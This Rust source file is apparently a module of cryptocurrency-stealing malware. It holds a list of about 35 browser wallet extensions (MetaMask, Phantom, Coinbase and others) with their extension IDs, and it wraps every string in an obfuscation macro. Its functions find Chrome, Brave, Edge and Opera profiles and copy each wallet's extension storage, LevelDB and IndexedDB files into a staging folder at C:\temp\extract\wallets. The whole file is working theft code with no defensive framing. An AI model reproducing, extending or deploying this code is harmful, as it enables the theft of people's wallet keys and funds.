use crate::sprotect;
use std::fs;
use std::path::PathBuf;

struct WalletExtension {
    name: String,
    extension_id: String,
    browsers: Vec<String>,
}

fn get_wallet_extensions() -> Vec<WalletExtension> {
    vec![
        WalletExtension {
            name: sprotect!("MetaMask"),
            extension_id: sprotect!("nkbihfbeogaeaoehlefnkodbefgpgknn"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
                sprotect!("Edge"),
                sprotect!("Opera"),
            ],
        },
        WalletExtension {
            name: sprotect!("Phantom"),
            extension_id: sprotect!("bfnaelmomeimhlpmgjnjophhpkkoljpa"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
                sprotect!("Edge"),
            ],
        },
        WalletExtension {
            name: sprotect!("Coinbase"),
            extension_id: sprotect!("hnfanknocfeofbddgcijnmhnfnkdnaad"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
                sprotect!("Edge"),
            ],
        },
        WalletExtension {
            name: sprotect!("TronLink"),
            extension_id: sprotect!("ibnejdfjmmkpcnlpebklmnkoeoihofec"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
                sprotect!("Edge"),
            ],
        },
        WalletExtension {
            name: sprotect!("Ronin"),
            extension_id: sprotect!("fnjhmkhhmkbjkkabndcnnogagogbneec"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("BinanceChain"),
            extension_id: sprotect!("fhbohimaelbohpjbbldcngcnapndodjp"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Trust"),
            extension_id: sprotect!("egjidjbpglichdcondbcbdnbeeppgdph"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
                sprotect!("Edge"),
            ],
        },
        WalletExtension {
            name: sprotect!("WalletConnect"),
            extension_id: sprotect!("amkmjjmmflddogmhpjloimipbofnfjih"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Math"),
            extension_id: sprotect!("afbcbjpbpfadlkmhmclhkeeodmamcflc"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Nifty"),
            extension_id: sprotect!("jbdaocneiiinmjbjlgalhcelgbejmnid"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Liquality"),
            extension_id: sprotect!("kpfopkelmapcoipemfendmdcghnegimn"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("XDEFI"),
            extension_id: sprotect!("hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Nami"),
            extension_id: sprotect!("lpfcbjknijpeeillifnkikgncikgfhdo"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Eternl"),
            extension_id: sprotect!("kmhcihpebfmpgmihbkipmjlmmioameka"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Yoroi"),
            extension_id: sprotect!("ffnbelfdoeiohenkjibnmadjiehjhajb"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
                sprotect!("Edge"),
            ],
        },
        WalletExtension {
            name: sprotect!("Solflare"),
            extension_id: sprotect!("bhhhlbepdkbapadjdnnojkbgioiodbic"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
                sprotect!("Edge"),
            ],
        },
        WalletExtension {
            name: sprotect!("Slope"),
            extension_id: sprotect!("pocmplpaccanhmnllbbkpgfliimjljgo"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Starcoin"),
            extension_id: sprotect!("mfhbebgoclkghebffdldpobeajmbecfk"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Swash"),
            extension_id: sprotect!("cmndjbecilbocjfkibfbifhngkdmjgog"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Finnie"),
            extension_id: sprotect!("cjmkndjhnagcfbpimnkdpomccnjdmhlicdoj"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Keplr"),
            extension_id: sprotect!("dmkamcknogkgcdfhhbddcghachkejeap"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
                sprotect!("Edge"),
            ],
        },
        WalletExtension {
            name: sprotect!("Cosmostation"),
            extension_id: sprotect!("fpkhgmpbidmiogeglndfbkegfdlnajnf"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("ICONex"),
            extension_id: sprotect!("flpiciilemghbmfalicajoolhkkenfel"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("KHC"),
            extension_id: sprotect!("hcflpincpppdclinealmandijcmnkbgn"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("TezBox"),
            extension_id: sprotect!("mnfifefkajgofkcjkemidiaecocnkjeh"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Cyano"),
            extension_id: sprotect!("dkdedlpgdmmkkfjabffeganieamfklkm"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Byone"),
            extension_id: sprotect!("nlgbhdfgdhgbiamfdfmbikcdghidoadd"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("OneKey"),
            extension_id: sprotect!("jnmbobjmhlngoefaiojfljckilhhlhcj"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
                sprotect!("Edge"),
            ],
        },
        WalletExtension {
            name: sprotect!("DAppPlay"),
            extension_id: sprotect!("lodccjjbdhfakaekdiahmedfbieldgik"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("BitClip"),
            extension_id: sprotect!("ijmpgkjfkbfhoebgogflfebnmejmfbm"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Steem"),
            extension_id: sprotect!("lkcjlnjfpbikmcmbachjpdbijejflpcm"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Nash"),
            extension_id: sprotect!("onofpnbbkehpmmoabgpcpmigafmmnjh"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Hycon"),
            extension_id: sprotect!("bcopgchhojmggmffilplmbdicgaihlkp"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("ZilPay"),
            extension_id: sprotect!("klnaejjgbibmhlephnhpmaofohgkpgkd"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
            ],
        },
        WalletExtension {
            name: sprotect!("Coin98"),
            extension_id: sprotect!("aeachknmefphepccionboohckonoeemg"),
            browsers: vec![
                sprotect!("Chrome"),
                sprotect!("Brave"),
                sprotect!("Edge"),
            ],
        },
    ]
}

fn get_browser_data_paths() -> Vec<(String, PathBuf)> {
    let mut paths = Vec::new();
    
    if let Ok(local_appdata) = std::env::var(sprotect!("LOCALAPPDATA")) {
        let base_path = PathBuf::from(local_appdata);
        
        paths.push((
            sprotect!("Chrome"),
            base_path.join(sprotect!("Google")).join(sprotect!("Chrome")).join(sprotect!("User Data"))
        ));
        
        paths.push((
            sprotect!("Brave"),
            base_path.join(sprotect!("BraveSoftware")).join(sprotect!("Brave-Browser")).join(sprotect!("User Data"))
        ));
        
        paths.push((
            sprotect!("Edge"),
            base_path.join(sprotect!("Microsoft")).join(sprotect!("Edge")).join(sprotect!("User Data"))
        ));
        
        paths.push((
            sprotect!("Opera"),
            base_path.join(sprotect!("Opera Software")).join(sprotect!("Opera Stable"))
        ));
    }
    
    paths
}

fn copy_wallet_files(source_dir: &PathBuf, dest_dir: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    if !source_dir.exists() {
        return Ok(());
    }
    
    fs::create_dir_all(dest_dir)?;
    
    let file_patterns = vec![
        sprotect!("*.log"),
        sprotect!("*.ldb"),
        sprotect!("*.sst"),
        sprotect!("CURRENT"),
        sprotect!("LOCK"),
        sprotect!("MANIFEST-*"),
    ];
    
    if let Ok(entries) = fs::read_dir(source_dir) {
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();
            let file_path = entry.path();
            
            let should_copy = file_patterns.iter().any(|pattern| {
                if pattern.contains('*') {
                    if pattern.starts_with('*') {
                        file_name.ends_with(&pattern[1..])
                    } else if pattern.ends_with('*') {
                        file_name.starts_with(&pattern[..pattern.len()-1])
                    } else {
                        file_name.contains(pattern)
                    }
                } else {
                    file_name == *pattern
                }
            });
            
            if should_copy && file_path.is_file() {
                let dest_file = dest_dir.join(&file_name);
                fs::copy(&file_path, &dest_file).ok();
            }
        }
    }
    
    let subdirs = vec![
        sprotect!("Local Storage"),
        sprotect!("IndexedDB"),
        sprotect!("Session Storage"),
    ];
    
    for subdir in subdirs {
        let source_subdir = source_dir.join(&subdir);
        let dest_subdir = dest_dir.join(&subdir);
        
        if source_subdir.exists() {
            copy_directory_recursive(&source_subdir, &dest_subdir).ok();
        }
    }
    
    Ok(())
}

fn copy_directory_recursive(source: &PathBuf, dest: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    if !source.exists() {
        return Ok(());
    }
    
    fs::create_dir_all(dest)?;
    
    if let Ok(entries) = fs::read_dir(source) {
        for entry in entries.flatten() {
            let source_path = entry.path();
            let dest_path = dest.join(entry.file_name());
            
            if source_path.is_dir() {
                copy_directory_recursive(&source_path, &dest_path)?;
            } else {
                fs::copy(&source_path, &dest_path).ok();
            }
        }
    }
    
    Ok(())
}

pub async fn extract_browser_wallets() -> Result<(), Box<dyn std::error::Error>> {
    let wallets = get_wallet_extensions();
    let browser_paths = get_browser_data_paths();
    
    for wallet in &wallets {
        for browser_path in &browser_paths {
            let browser_name = &browser_path.0;
            let browser_data_path = &browser_path.1;
            
            if !wallet.browsers.contains(browser_name) {
                continue;
            }
            
            let profiles = vec![
                sprotect!("Default"),
                sprotect!("Profile 1"),
                sprotect!("Profile 2"),
                sprotect!("Profile 3"),
                sprotect!("Profile 4"),
                sprotect!("Profile 5"),
            ];
            
            for profile in &profiles {
                let extension_path = browser_data_path
                    .join(profile)
                    .join(sprotect!("Local Extension Settings"))
                    .join(&wallet.extension_id);
                
                if extension_path.exists() {
                    let dest_path = PathBuf::from(sprotect!("C:\\temp\\extract\\wallets"))
                        .join(&wallet.name)
                        .join(browser_name)
                        .join(profile);
                    
                    copy_wallet_files(&extension_path, &dest_path).ok();
                }
                
                let sync_extension_path = browser_data_path
                    .join(profile)
                    .join(sprotect!("Sync Extension Settings"))
                    .join(&wallet.extension_id);
                
                if sync_extension_path.exists() {
                    let dest_path = PathBuf::from(sprotect!("C:\\temp\\extract\\wallets"))
                        .join(&wallet.name)
                        .join(browser_name)
                        .join(profile)
                        .join(sprotect!("Sync"));
                    
                    copy_wallet_files(&sync_extension_path, &dest_path).ok();
                }
            }
        }
    }
    
    Ok(())
}